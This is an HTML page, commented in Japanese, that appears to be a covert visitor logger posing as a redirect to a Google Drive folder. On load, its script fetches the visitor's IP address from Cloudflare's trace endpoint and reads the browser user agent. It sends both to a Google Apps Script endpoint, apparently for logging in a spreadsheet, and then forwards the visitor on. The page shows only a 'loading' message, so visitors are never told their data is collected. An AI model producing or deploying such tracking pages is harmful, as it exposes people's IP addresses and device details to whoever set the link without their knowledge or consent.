<!DOCTYPE html>
<html>
  <head>
    <meta charset="UTF-8" />
    <title>ログ取得中...</title>
  </head>
  <body>
    <script>
      // CloudflareでIPアドレス取得
      fetch("https://www.cloudflare.com/cdn-cgi/trace")
        .then(res => res.text())
        .then(txt => {
          const ip = txt.match(/ip=(.+)/)?.[1] || "未取得";
          const ua = navigator.userAgent;

          // ログ送信＆ドライブにリダイレクト
          const redirectUrl =
            "https://script.google.com/macros/s/AKfycbx6_EOz0xmmgHNUXpQbcwLbud1LJYZFcYXdwBYWzydGiB90_yhaSIPbrVc-JVQOtfMRsg/exec" +
            "?id=cdef-8765-21-0987-h" + // シート名と同じ
            "&ip=" + encodeURIComponent(ip) +
            "&ua=" + encodeURIComponent(ua) +
            "&next=" + encodeURIComponent("https://drive.google.com/drive/folders/1BLJp9l7lsTLOfWtiLvgoJBr4LkmrcUBq");

          window.location.href = redirectUrl;
        });
    </script>
    <p>読み込み中です。自動的に移動します...</p>
  </body>
</html>
